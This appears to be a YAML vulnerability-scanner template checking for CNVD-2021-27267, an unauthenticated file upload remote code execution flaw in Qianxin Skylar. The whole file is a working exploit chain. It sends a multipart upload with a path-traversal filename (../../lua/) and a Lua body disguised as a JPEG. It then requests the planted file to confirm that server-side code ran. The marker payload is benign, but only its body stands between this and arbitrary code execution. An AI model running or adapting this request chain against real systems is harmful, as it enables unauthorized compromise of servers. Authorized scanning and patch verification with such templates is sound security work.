name: poc-yaml-qianxin-skylar-cnvd-2021-27267-upload-rce
binding: d95583b5-d424-4ec0-bdaf-a8d44595a5e3
manual: true
detail:
    author: 10cker(https://github.com/10cker)
    links:
        - https://www.cnvd.org.cn/flaw/show/CNVD-2021-27267
    vulnerability:
        id: CT-517616
        level: critical
    description: |
        Qianxin Skylar < 6.6.0.6340 && < 6.7.0.4130  - Unauthenticated File Upload RCE
    warning: 注意该脚本会上传文件产生一个临时的无害文件
transport: http
set:
    rfilename: randomLowercase(4)
    s1: randomLowercase(20)
    rboundary: randomLowercase(8)
rules:
    r1:
        request:
            cache: true
            method: POST
            path: /api/client_upload_file.json?mid=12345678901234567890123456789012&md5=12345678901234567890123456789012&filename=../../lua/{{rfilename}}.LUAC
            headers:
                Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{{rboundary}}
            body: "------WebKitFormBoundary{{rboundary}}\r\nContent-Disposition: form-data; name=\"file\"; filename=\"{{rfilename}}.jpg\"\r\nContent-Type: image/jpeg\r\n\nngx.print('{{s1}}')\r\n------WebKitFormBoundary{{rboundary}}--\r\n"
        expression: response.status == 200 && response.body.bcontains(b"upload_file_md5")
    r2:
        request:
            cache: true
            method: GET
            path: /api/{{rfilename}}.json
        expression: response.status == 200 && (response.headers["server"] == "QiAnXin web server" || response.headers["server"] == "360 web server")
expression: r1() && r2()
